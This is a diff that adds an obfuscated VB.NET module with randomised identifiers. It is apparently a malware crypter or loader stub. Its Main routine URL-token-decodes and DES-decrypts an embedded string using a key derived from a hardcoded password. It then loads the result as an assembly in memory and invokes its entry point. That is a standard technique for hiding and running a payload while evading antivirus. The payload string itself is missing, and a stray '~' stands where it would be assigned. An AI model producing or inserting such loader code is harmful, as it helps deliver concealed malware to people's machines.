@@ -1,0 +1,43 @@
+Imports System.Security.Cryptography
+Imports System.IO
+Imports System.Web
+Imports System.Text
+Imports System
+Imports Microsoft.VisualBasic
+Imports System.Reflection
+Imports System.Runtime.InteropServices
+Imports Microsoft.Win32
+Imports System.Net
+Imports System.Windows
+Imports System.Windows.Forms
+Imports System.IO.Compression
+Imports System.Diagnostics
+Imports System.Collections
+Imports System.Collections.Generic
+Imports System.Threading
+Imports System.Security.AccessControl
+Imports System.ComponentModel
+Imports System.Security.Principal
+Module OcYjzPUtJkNbLOABqYvNbvhZf 
+Dim gwiXxyIDDtoYzgMSRGMckRbJi As String
+    Sub Main()	
+        ~
+        System.Threading.Thread.GetDomain.Load(BclWgISTcaGjnwrzSCIuKruKm(gwiXxyIDDtoYzgMSRGMckRbJi)).EntryPoint.Invoke(0, New System.Object(1 - 2) {})
+    End Sub
+    Public Function BclWgISTcaGjnwrzSCIuKruKm(ByVal CJyUSiUNrIVbgksjxpAMUkAJJ As String) As Byte()
+        Dim fAMVdoPUEyHEWdxQIEJPRYbEN As New DESCryptoServiceProvider
+        Dim CIGQUctdcUPqUjoucmcoffECY() As Byte
+        Dim wcZfHOgetgAExzSoWFJFQdAyO() As Byte = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 0}
+        Dim DqYKDnIoLeZDWYlQWoxZnpfPR As New Rfc2898DeriveBytes("MkhMoOHCbGUMqtnRDJKnBYnOj", wcZfHOgetgAExzSoWFJFQdAyO)
+        fAMVdoPUEyHEWdxQIEJPRYbEN.Key = DqYKDnIoLeZDWYlQWoxZnpfPR.GetBytes(fAMVdoPUEyHEWdxQIEJPRYbEN.Key.Length)
+        fAMVdoPUEyHEWdxQIEJPRYbEN.IV = DqYKDnIoLeZDWYlQWoxZnpfPR.GetBytes(fAMVdoPUEyHEWdxQIEJPRYbEN.IV.Length)
+        Dim sHEqLMGglkBAOIUfcSAgMvZfs As New MemoryStream
+        Dim JtZApJhbFAIFxzHLjjyEQvtgd As New CryptoStream(sHEqLMGglkBAOIUfcSAgMvZfs, fAMVdoPUEyHEWdxQIEJPRYbEN.CreateDecryptor(), CryptoStreamMode.Write)
+        CIGQUctdcUPqUjoucmcoffECY = System.Web.HttpServerUtility.UrlTokenDecode(CJyUSiUNrIVbgksjxpAMUkAJJ)
+        JtZApJhbFAIFxzHLjjyEQvtgd.Write(CIGQUctdcUPqUjoucmcoffECY, 0, CIGQUctdcUPqUjoucmcoffECY.Length)
+        JtZApJhbFAIFxzHLjjyEQvtgd.Close()
+        CJyUSiUNrIVbgksjxpAMUkAJJ = UnicodeEncoding.BigEndianUnicode.GetString(sHEqLMGglkBAOIUfcSAgMvZfs.ToArray)
+        Dim IIQrSWZEMmoQIKGuxxwoTwXka As Byte() = System.Web.HttpServerUtility.UrlTokenDecode(CJyUSiUNrIVbgksjxpAMUkAJJ)
+        Return IIQrSWZEMmoQIKGuxxwoTwXka
+    End Function
+	End Module
